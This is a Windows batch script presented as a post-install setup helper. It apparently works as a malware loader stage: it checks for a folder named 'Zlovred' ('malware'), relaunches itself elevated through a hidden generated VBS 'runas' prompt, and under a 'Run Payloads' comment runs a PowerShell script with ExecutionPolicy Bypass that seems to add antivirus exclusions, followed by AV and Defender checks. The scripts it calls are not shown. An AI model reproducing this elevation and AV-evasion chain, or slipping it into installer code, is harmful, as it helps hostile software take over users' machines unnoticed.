@echo on
rem *******************************************************
rem postinstallscript.bat
rem This Script will pre-adjust installation of the necessary
rem packets for a Windows adjusting
rem It runs after procedure of Scripts' Set Installation and
rem will need to use necessarily.
rem Don't uncheck corresponded checkbox after installation!
rem 
rem The Script needs elevated privileges and long names support
rem 
rem RETURNS:
rem     0 if Succes
rem     1 if Check integrity Error or Files not found
rem     17 if run without elevated privileges
rem 
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Set Variables
rem 
rem Set Paths

set ZLOVREDPATH=C:\pub1\Distrib\Zlovred
set pathCMD=%SystemRoot%\System32
set CURDIR=%CD%
set SCRIPTDIR=%~dp0

rem Set System Utilities paths
set POSHEXE=%pathCMD%\WindowsPowerShell\v1.0\powershell.exe
set CSCRIPTEXE=%pathCMD%\cscript.exe

rem Check Integrity
if not exist %SCRIPTDIR% echo A Script must be run from Local or Network Disks && exit /b 1
if not exist %ZLOVREDPATH% echo The folder %ZLOVREDPATH% is not found && exit /b 1
if not exist %POSHEXE% echo The file %POSHEXE% is not found && exit /b 1
if not exist %CSCRIPTEXE% echo The file %CSCRIPTEXE% is not found && exit /b 1

rem Set Program Names
set CHECKARCH=checkArch.bat
set CHECKCODEPAGE=checkCodePage.cmd
set CHECKDEFENDER=checkDef.cmd
set CHECKDOTNET00=checkdotNet481Installed.js
set CHECKREDIST00=checkRedist2015bundle.js
set CHECKWINOS=checkWinOS.cmd
set CHKADMIN=chkadmin.exe
set CURL=CURL.EXE
set ELE=ele.exe
set GETAVDETAILS=Get-AntivirusDetails.ps1
set GETOSARCH=getOSArch.ps1
set GETWINOSEXAMPLE=getWinOperationSystem.Example.js
set LAUNCH=Launch.exe
set LIBCURL=LIBCURL.DLL
set NITMAKETEMP=NIT-MakeTemp.silent.wsf
set NITCHECKWMFVER=NIT.Check-WMFVersion.ps1
set NITNEWINITEXCL=nit.new-InitialExcl.ps1
set NITGETOSVER=NITGetOSVersion.exe
set OSARCHDETECT=osArchDetect.bat
set POWERRUN32=PowerRun.exe
set POWERRUNINI=PowerRun.ini
set UNRAR=UnRAR.exe
set UNZIP=unzip.exe
set WGET=wget.exe
set WINICONV=win_iconv.exe
set CHECKAV=checkAVExclusions.bat



rem Check Integrity
if not exist %SCRIPTDIR%%CHECKARCH% echo The file %SCRIPTDIR%%CHECKARCH% is not found && exit /b 1
if not exist %SCRIPTDIR%%CHECKCODEPAGE% echo The file %SCRIPTDIR%%CHECKCODEPAGE% is not found && exit /b 1
if not exist %SCRIPTDIR%%CHECKDEFENDER% echo The file %SCRIPTDIR%%CHECKDEFENDER% is not found && exit /b 1
if not exist %SCRIPTDIR%%CHECKDOTNET00% echo The file %SCRIPTDIR%%CHECKDOTNET00% is not found && exit /b 1
if not exist %SCRIPTDIR%%CHECKREDIST00% echo The file %SCRIPTDIR%%CHECKREDIST00% is not found && exit /b 1
if not exist %SCRIPTDIR%%CHECKWINOS% echo The file %SCRIPTDIR%%CHECKWINOS% is not found && exit /b 1
if not exist %SCRIPTDIR%%CHKADMIN% echo The file %SCRIPTDIR%%CHKADMIN% is not found && exit /b 1
if not exist %SCRIPTDIR%%CURL% echo The file %SCRIPTDIR%%CURL% is not found && exit /b 1
if not exist %SCRIPTDIR%%ELE% echo The file %SCRIPTDIR%%ELE% is not found && exit /b 1
if not exist %SCRIPTDIR%%GETAVDETAILS% echo The file %SCRIPTDIR%%GETAVDETAILS% is not found && exit /b 1
if not exist %SCRIPTDIR%%GETOSARCH% echo The file %SCRIPTDIR%%GETOSARCH% is not found && exit /b 1
if not exist %SCRIPTDIR%%GETWINOSEXAMPLE% echo The file %SCRIPTDIR%%GETWINOSEXAMPLE% is not found && exit /b 1
if not exist %SCRIPTDIR%%LAUNCH% echo The file %SCRIPTDIR%%LAUNCH% is not found && exit /b 1
if not exist %SCRIPTDIR%%LIBCURL% echo The file %SCRIPTDIR%%LIBCURL% is not found && exit /b 1
if not exist %SCRIPTDIR%%NITMAKETEMP% echo The file %SCRIPTDIR%%NITMAKETEMP% is not found && exit /b 1
if not exist %SCRIPTDIR%%NITCHECKWMFVER% echo The file %SCRIPTDIR%%NITCHECKWMFVER% is not found && exit /b 1
if not exist %SCRIPTDIR%%NITNEWINITEXCL% echo The file %SCRIPTDIR%%NITNEWINITEXCL% is not found && exit /b 1
if not exist %SCRIPTDIR%%NITGETOSVER% echo The file %SCRIPTDIR%%NITGETOSVER% is not found && exit /b 1
if not exist %SCRIPTDIR%%OSARCHDETECT% echo The file %SCRIPTDIR%%OSARCHDETECT% is not found && exit /b 1
if not exist %SCRIPTDIR%%POWERRUN32% echo The file %SCRIPTDIR%%POWERRUN32% is not found && exit /b 1
if not exist %SCRIPTDIR%%POWERRUNINI% echo The file %SCRIPTDIR%%POWERRUNINI% is not found && exit /b 1
if not exist %SCRIPTDIR%%UNRAR% echo The file %SCRIPTDIR%%UNRAR% is not found && exit /b 1
if not exist %SCRIPTDIR%%UNZIP% echo The file %SCRIPTDIR%%UNZIP% is not found && exit /b 1
if not exist %SCRIPTDIR%%WGET% echo The file %SCRIPTDIR%%WGET% is not found && exit /b 1
if not exist %SCRIPTDIR%%WINICONV% echo The file %SCRIPTDIR%%WINICONV% is not found && exit /b 1
if not exist %SCRIPTDIR%%CHECKAV% echo The file %SCRIPTDIR%%CHECKAV% is not found && exit /b 1

rem CheckIfAdminRun
rem %CHKADMIN%
rem if %ERRORLEVEL% equ 1 echo The Script must be run with Elevated Privileges. Exiting... && exit /b 17

rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
rem exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...


rem Run Payloads
%CSCRIPTEXE% //NoLogo %SCRIPTDIR%%NITMAKETEMP%
%POSHEXE% -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%SCRIPTDIR%%NITNEWINITEXCL%"
call %SCRIPTDIR%%CHECKAV%
call %SCRIPTDIR%%CHECKDEFENDER%
echo Checking Antivirus Exit Code: %errorlevel%


rem %CSCRIPTEXE% //NOLOGO %SCRIPTDIR%%GETWINOSEXAMPLE%

endlocal

rem The End
echo The Script %0 is Run with Success
exit /b 0


